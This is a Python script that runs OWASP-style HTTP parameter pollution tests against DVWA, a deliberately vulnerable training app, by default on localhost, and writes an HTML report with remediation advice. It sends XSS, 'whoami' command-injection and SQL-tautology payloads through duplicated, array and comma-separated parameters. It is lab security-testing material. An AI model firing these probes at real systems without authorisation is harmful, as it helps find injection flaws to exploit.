#!/usr/bin/env python3
"""
DVWA HTTP Parameter Pollution Testing Script
OWASP OTG-INPVAL-004 Compliance
Generates OWASP/OSCP-style HTML report
"""

import requests
from bs4 import BeautifulSoup
import argparse
import datetime
import json
import os
import sys
import urllib3
import html
from urllib.parse import urljoin, urlencode, parse_qs, urlparse

# Disable SSL warnings for localhost testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DVWAHTTPParameterPollutionTester:
    def __init__(self, base_url, username, password, output_file, timeout=10):
        self.base_url = base_url.rstrip('/')
        self.login_url = urljoin(self.base_url + '/', 'login.php')
        self.timeout = timeout
        self.username = username
        self.password = password
        self.output_file = output_file
        self.session = requests.Session()
        # Set a user agent to avoid potential blocking
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        self.endpoints = []
        print(f"[*] Base URL: {self.base_url}")
        print(f"[*] Login URL: {self.login_url}")
        
    def get_csrf_token(self, url):
        """Extract CSRF token from page"""
        try:
            print(f"[*] Fetching page: {url}")
            response = self.session.get(url, verify=False, timeout=self.timeout)
            print(f"[*] Response status: {response.status_code}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Try multiple methods to find CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            if not token_input:
                # Try finding by ID
                token_input = soup.find('input', {'id': 'user_token'})
            if not token_input:
                # Try finding any hidden input that might be the token
                hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                for inp in hidden_inputs:
                    if inp.get('name') and 'token' in inp.get('name').lower():
                        token_input = inp
                        break
            
            if token_input and token_input.get('value'):
                token = token_input['value']
                print(f"[+] Found CSRF token: {token[:20]}...")
                return token
            else:
                print("[-] CSRF token input not found in HTML")
                return None
                
        except Exception as e:
            print(f"[-] Error getting CSRF token: {e}")
            return None
    
    def login(self):
        """Login to DVWA"""
        print("[*] Logging into DVWA...")
        try:
            # First, get the main page to establish session
            print("[*] Getting main page to establish session...")
            main_response = self.session.get(self.base_url, verify=False, timeout=self.timeout)
            print(f"[*] Main page response status: {main_response.status_code}")
            
            # Get login page to extract CSRF token
            token = self.get_csrf_token(self.login_url)
            if not token:
                print("[-] Failed to get CSRF token")
                return False
            
            # Perform login
            login_data = {
                'username': self.username,
                'password': self.password,
                'Login': 'Login',
                'user_token': token
            }
            
            print("[*] Sending login request...")
            response = self.session.post(self.login_url, data=login_data, allow_redirects=True, verify=False, timeout=self.timeout)
            
            # Check if login was successful
            if "Login failed" in response.text or "login.php" in response.url:
                print("[-] Login failed")
                print(f"Response URL: {response.url}")
                return False
            
            print("[+] Login successful")
            return True
            
        except requests.exceptions.ConnectionError:
            print("[-] Connection error - make sure DVWA is running on localhost")
            return False
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False
    
    def discover_endpoints(self):
        """Discover GET parameter endpoints in DVWA"""
        print("[*] Discovering GET parameter endpoints...")
        
        # Common DVWA modules to test
        dvwa_modules = [
            'vulnerabilities/exec/',      # Command Execution
            'vulnerabilities/xss_r/',     # Reflected XSS
            'vulnerabilities/sqli/',      # SQL Injection
            'vulnerabilities/sqli_blind/', # Blind SQL Injection
        ]
        
        for module in dvwa_modules:
            module_url = urljoin(self.base_url + '/', module)
            try:
                print(f"[*] Checking module: {module}")
                response = self.session.get(module_url, verify=False, timeout=self.timeout)
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all forms that use GET method
                    forms = soup.find_all('form', method=lambda x: x and x.upper() == 'GET')
                    for i, form in enumerate(forms):
                        action = form.get('action', '')
                        method = form.get('method', 'GET').upper()
                        
                        # Resolve relative URLs
                        if action:
                            full_action = urljoin(module_url, action)
                        else:
                            full_action = module_url
                        
                        # Extract form parameters
                        params = []
                        for input_field in form.find_all(['input', 'textarea', 'select']):
                            param_name = input_field.get('name')
                            if param_name:
                                params.append(param_name)
                        
                        if params:  # Only add endpoints that have parameters
                            endpoint_info = {
                                'url': full_action,
                                'method': method,
                                'parameters': params,
                                'module': module
                            }
                            
                            # Avoid duplicates
                            if endpoint_info not in self.endpoints:
                                self.endpoints.append(endpoint_info)
                                print(f"[+] Found endpoint: {full_action} with params: {params}")
                
                    # Also look for links with query parameters
                    links = soup.find_all('a', href=True)
                    for link in links:
                        href = link['href']
                        if '?' in href and href.startswith('/'):
                            full_url = urljoin(self.base_url, href)
                            parsed = urlparse(full_url)
                            query_params = parse_qs(parsed.query)
                            param_names = list(query_params.keys())
                            
                            if param_names:
                                endpoint_info = {
                                    'url': full_url.split('?')[0],
                                    'method': 'GET',
                                    'parameters': param_names,
                                    'module': module,
                                    'query_params': dict(query_params)
                                }
                                
                                if endpoint_info not in self.endpoints:
                                    self.endpoints.append(endpoint_info)
                                    print(f"[+] Found GET endpoint: {full_url.split('?')[0]} with params: {param_names}")
                
            except Exception as e:
                print(f"[-] Error checking module {module}: {e}")
        
        print(f"[+] Discovered {len(self.endpoints)} endpoints")
    
    def test_parameter_pollution(self):
        """Test HTTP Parameter Pollution on discovered endpoints"""
        print("[*] Testing HTTP Parameter Pollution...")
        
        # Test payloads
        test_payloads = [
            ('benign', 'test'),
            ('malicious', '<script>alert("HPP")</script>'),
            ('command', 'whoami'),
            ('sql', "' OR '1'='1")
        ]
        
        pollution_techniques = [
            {
                'name': 'Duplicate Parameters',
                'function': self._duplicate_params
            },
            {
                'name': 'Array Notation',
                'function': self._array_notation_params
            },
            {
                'name': 'Comma Separation',
                'function': self._comma_separation_params
            }
        ]
        
        for endpoint in self.endpoints:
            url = endpoint['url']
            parameters = endpoint['parameters']
            module = endpoint['module']
            
            print(f"[*] Testing endpoint: {url}")
            
            # Test each parameter
            for param in parameters:
                print(f"  [*] Testing parameter: {param}")
                
                # Test each pollution technique
                for technique in pollution_techniques:
                    technique_name = technique['name']
                    technique_func = technique['function']
                    
                    # Test with each payload type
                    for payload_type, payload_value in test_payloads:
                        try:
                            # Create polluted parameters
                            polluted_params = technique_func(param, payload_value)
                            
                            print(f"    [*] Testing {technique_name} with {payload_type} payload")
                            
                            # Send request
                            response = self.session.get(
                                url, 
                                params=polluted_params, 
                                verify=False, 
                                timeout=self.timeout
                            )
                            
                            # Analyze response
                            result = {
                                'url': url,
                                'module': module,
                                'parameter': param,
                                'technique': technique_name,
                                'payload_type': payload_type,
                                'payload': payload_value,
                                'polluted_params': str(polluted_params),
                                'status_code': response.status_code,
                                'response_length': len(response.text),
                                'vulnerable': False,
                                'description': '',
                                'response_preview': response.text[:200] + '...' if len(response.text) > 200 else response.text
                            }
                            
                            # Check for vulnerabilities
                            # Look for evidence of parameter pollution in response
                            if payload_value in response.text:
                                # Check if both values appear or if behavior changed
                                if technique_name == 'Duplicate Parameters':
                                    # For duplicate params, check if both values are processed
                                    result['vulnerable'] = True
                                    result['description'] = f"Both parameter values processed or unexpected behavior detected"
                                elif payload_type == 'malicious' and '<script>' in response.text:
                                    result['vulnerable'] = True
                                    result['description'] = f"Malicious payload executed - potential XSS via HPP"
                                elif payload_type == 'command' and ('root' in response.text.lower() or 'administrator' in response.text.lower()):
                                    result['vulnerable'] = True
                                    result['description'] = f"Command execution detected via HPP"
                            
                            self.results.append(result)
                            
                            if result['vulnerable']:
                                print(f"    [+] VULNERABLE: {technique_name} on {param} - {result['description']}")
                            
                        except Exception as e:
                            print(f"    [-] Error testing {technique_name} on {param}: {e}")
                            self.results.append({
                                'url': url,
                                'module': module,
                                'parameter': param,
                                'technique': technique_name,
                                'payload_type': payload_type,
                                'payload': payload_value,
                                'polluted_params': 'Error',
                                'status_code': 0,
                                'response_length': 0,
                                'vulnerable': False,
                                'description': f'Error: {str(e)}',
                                'error': True
                            })
    
    def _duplicate_params(self, param_name, value):
        """Create duplicate parameter pollution"""
        return [(param_name, value + '_first'), (param_name, value + '_second')]
    
    def _array_notation_params(self, param_name, value):
        """Create array notation parameter pollution"""
        return [(param_name + '[]', value + '_first'), (param_name + '[]', value + '_second')]
    
    def _comma_separation_params(self, param_name, value):
        """Create comma separation parameter pollution"""
        return {param_name: value + '_first,' + value + '_second'}
    
    def generate_html_report(self):
        """Generate OWASP/OSCP-style HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HTTP Parameter Pollution Assessment - DVWA (OTG-INPVAL-004)</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .header {{
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.2em;
        }}
        .header p {{
            margin: 10px 0 0 0;
            opacity: 0.9;
        }}
        .section {{
            background: white;
            margin-bottom: 25px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .section-title {{
            color: #2a5298;
            border-bottom: 2px solid #2a5298;
            padding-bottom: 10px;
            margin-top: 0;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #2a5298;
            color: white;
        }}
        tr:nth-child(even) {{
            background-color: #f2f2f2;
        }}
        .vulnerable {{
            background-color: #ffebee;
            color: #c62828;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .not-vulnerable {{
            background-color: #e8f5e8;
            color: #2e7d32;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .code {{
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 15px 0;
            white-space: pre-wrap;
        }}
        .risk-high {{
            color: #d32f2f;
            font-weight: bold;
        }}
        .risk-medium {{
            color: #f57c00;
            font-weight: bold;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #666;
            font-size: 0.9em;
        }}
        .summary-box {{
            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 5px solid #1e88e5;
        }}
        .findings-summary {{
            display: flex;
            justify-content: space-around;
            text-align: center;
            margin: 20px 0;
        }}
        .finding-item {{
            padding: 15px;
            border-radius: 8px;
            color: white;
        }}
        .finding-vuln {{
            background-color: #d32f2f;
        }}
        .finding-safe {{
            background-color: #388e3c;
        }}
        code {{
            font-family: 'Courier New', monospace;
            background-color: #f5f5f5;
            padding: 2px 4px;
            border-radius: 3px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>HTTP Parameter Pollution Assessment</h1>
        <p>DVWA Security Test - OWASP Testing Guide OTG-INPVAL-004</p>
    </div>

    <div class="section">
        <h2 class="section-title">Executive Summary</h2>
        <div class="summary-box">
            <p>This assessment identified <span class="risk-high">{vulnerable_count} HTTP Parameter Pollution vulnerabilities</span> in the DVWA application. HTTP Parameter Pollution (HPP) occurs when applications process multiple parameters with the same name in unexpected ways, potentially leading to input validation bypass, security control circumvention, or other vulnerabilities.</p>
        </div>
        <div class="findings-summary">
            <div class="finding-item finding-vuln">
                <h3>{vulnerable_count}</h3>
                <p>Vulnerable Tests</p>
            </div>
            <div class="finding-item finding-safe">
                <h3>{len(self.results) - vulnerable_count}</h3>
                <p>Secure Tests</p>
            </div>
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Test Details</h2>
        <table>
            <tr>
                <td><strong>Target Application</strong></td>
                <td>Damn Vulnerable Web Application (DVWA)</td>
            </tr>
            <tr>
                <td><strong>Test Type</strong></td>
                <td>HTTP Parameter Pollution</td>
            </tr>
            <tr>
                <td><strong>OWASP Test ID</strong></td>
                <td>OTG-INPVAL-004</td>
            </tr>
            <tr>
                <td><strong>Risk Level</strong></td>
                <td><span class="risk-medium">Medium</span></td>
            </tr>
            <tr>
                <td><strong>Test Date</strong></td>
                <td>{timestamp}</td>
            </tr>
            <tr>
                <td><strong>Target URL</strong></td>
                <td>{self.base_url}</td>
            </tr>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Methodology</h2>
        <p>The testing methodology followed the OWASP Testing Guide for HTTP Parameter Pollution:</p>
        <ol>
            <li><strong>Authentication</strong>: Logged into DVWA with provided credentials</li>
            <li><strong>Endpoint Discovery</strong>: Identified GET parameter endpoints throughout DVWA modules</li>
            <li><strong>Pollution Testing</strong>: Tested various parameter pollution techniques including duplicate parameters, array notation, and comma separation</li>
            <li><strong>Analysis</strong>: Documented endpoints that processed polluted parameters in unexpected ways</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">Findings</h2>
        <p>The following parameter pollution tests were conducted:</p>
        <table>
            <thead>
                <tr>
                    <th>Module</th>
                    <th>Parameter</th>
                    <th>Technique</th>
                    <th>Payload Type</th>
                    <th>Status</th>
                    <th>Status Code</th>
                </tr>
            </thead>
            <tbody>"""
        
        # Sort results by vulnerability status
        sorted_results = sorted(self.results, key=lambda x: (not x.get('vulnerable', False), x['url'], x['parameter']))
        
        for result in sorted_results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "not-vulnerable"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            
            html_content += f"""
                <tr>
                    <td>{html.escape(result.get('module', 'Unknown'))}</td>
                    <td>{html.escape(result.get('parameter', 'N/A'))}</td>
                    <td>{html.escape(result.get('technique', 'N/A'))}</td>
                    <td>{html.escape(result.get('payload_type', 'N/A'))}</td>
                    <td><span class="{status_class}">{status_text}</span></td>
                    <td>{result.get('status_code', 'N/A')}</td>
                </tr>"""
            
            # Add description row if vulnerable
            if result.get('vulnerable', False):
                html_content += f"""
                <tr>
                    <td colspan="6" style="background-color: #fff3e0;">
                        <strong>Description:</strong> {html.escape(result.get('description', ''))}<br>
                        <strong>Parameters:</strong> {html.escape(str(result.get('polluted_params', '')))}
                    </td>
                </tr>"""
        
        html_content += f"""
            </tbody>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Detailed Vulnerabilities</h2>
        <p>The following HTTP Parameter Pollution vulnerabilities were identified:</p>"""
        
        # Show only vulnerable results with details
        vulnerable_results = [r for r in self.results if r.get('vulnerable', False)]
        
        if vulnerable_results:
            for i, result in enumerate(vulnerable_results, 1):
                html_content += f"""
        <div class="code">
<strong>Vulnerability #{i}</strong>
Module: {html.escape(result.get('module', 'Unknown'))}
Endpoint: {html.escape(result.get('url', 'N/A'))}
Parameter: {html.escape(result.get('parameter', 'N/A'))}
Technique: {html.escape(result.get('technique', 'N/A'))}
Payload Type: {html.escape(result.get('payload_type', 'N/A'))}
Description: {html.escape(result.get('description', ''))}
Parameters Sent: {html.escape(str(result.get('polluted_params', '')))}
Status Code: {result.get('status_code', 'N/A')}
Response Preview: {html.escape(result.get('response_preview', '')[:300])}
        </div>"""
        else:
            html_content += """
        <p>No HTTP Parameter Pollution vulnerabilities were found in the tested endpoints.</p>"""
        
        html_content += f"""
    </div>

    <div class="section">
        <h2 class="section-title">HTTP Parameter Pollution Techniques</h2>
        <p>The following techniques were tested for parameter pollution:</p>
        <ul>
            <li><strong>Duplicate Parameters</strong>: Sending the same parameter multiple times (e.g., ?param=value1&param=value2)</li>
            <li><strong>Array Notation</strong>: Using array syntax (e.g., ?param[]=value1&param[]=value2)</li>
            <li><strong>Comma Separation</strong>: Separating values with commas (e.g., ?param=value1,value2)</li>
        </ul>
        <p>Different web servers and frameworks handle these techniques differently, which can lead to security vulnerabilities.</p>
    </div>

    <div class="section">
        <h2 class="section-title">Remediation Recommendations</h2>
        <p>To prevent HTTP Parameter Pollution vulnerabilities, implement the following measures:</p>
        <ol>
            <li><strong>Input Validation</strong>: Validate and sanitize all input parameters, especially when multiple values are expected</li>
            <li><strong>Framework Configuration</strong>: Configure web frameworks to handle duplicate parameters consistently</li>
            <li><strong>Explicit Parameter Handling</strong>: Explicitly define how the application should handle multiple parameters with the same name</li>
            <li><strong>Security Testing</strong>: Include HTTP Parameter Pollution testing in regular security assessments</li>
            <li><strong>Web Server Configuration</strong>: Configure web servers to handle parameter pollution according to application requirements</li>
            <li><strong>Monitoring</strong>: Implement logging and monitoring for unusual parameter patterns</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">References</h2>
        <ul>
            <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution">OWASP Testing Guide - OTG-INPVAL-004</a></li>
            <li><a href="https://owasp.org/www-community/attacks/HTTP_Parameter_Pollution">OWASP HTTP Parameter Pollution</a></li>
            <li><a href="https://owasp.org/www-community/attacks/Code_Injection">OWASP Code Injection</a></li>
            <li><a href="https://github.com/digininja/DVWA">Damn Vulnerable Web Application (DVWA) Documentation</a></li>
        </ul>
    </div>

    <div class="footer">
        <p>Generated by DVWA HTTP Parameter Pollution Testing Script | OWASP/OSCP-Style Report</p>
        <p>Report generated on: {timestamp}</p>
    </div>
</body>
</html>"""
        
        # Write report to file
        try:
            os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"[+] HTML report saved to: {self.output_file}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def run(self):
        """Main execution method"""
        print("=== DVWA HTTP Parameter Pollution Testing Script ===")
        print(f"Target: {self.base_url}")
        print(f"Output: {self.output_file}")
        print()
        
        # Login to DVWA
        if not self.login():
            print("[-] Failed to login. Exiting.")
            return False
        
        # Discover endpoints
        self.discover_endpoints()
        
        if not self.endpoints:
            print("[-] No endpoints discovered. Exiting.")
            return False
        
        # Test parameter pollution
        self.test_parameter_pollution()
        
        # Generate report
        self.generate_html_report()
        
        # Summary
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        total_tests = len(self.results)
        print(f"\n=== Test Summary ===")
        print(f"Total endpoints tested: {len(self.endpoints)}")
        print(f"Total parameter pollution tests: {total_tests}")
        print(f"Vulnerable cases: {vulnerable_count}")
        print(f"Security status: {'VULNERABLE' if vulnerable_count > 0 else 'SECURE'}")
        
        return True

def main():
    parser = argparse.ArgumentParser(description='DVWA HTTP Parameter Pollution Testing Script (OTG-INPVAL-004)')
    parser.add_argument('--url', default='http://localhost/dvwa', help='DVWA base URL (default: http://localhost/dvwa)')
    parser.add_argument('--username', default='admin', help='DVWA username (default: admin)')
    parser.add_argument('--password', default='password', help='DVWA password (default: password)')
    parser.add_argument('--output', default='reports/http_parameter_pollution_report.html', help='Output HTML report file (default: reports/http_parameter_pollution_report.html)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    # Create tester instance
    tester = DVWAHTTPParameterPollutionTester(args.url, args.username, args.password, args.output, args.timeout)
    
    # Run tests
    success = tester.run()
    
    if success:
        print(f"\n[+] Testing completed successfully!")
        print(f"[+] Check report: {args.output}")
    else:
        print(f"\n[-] Testing failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()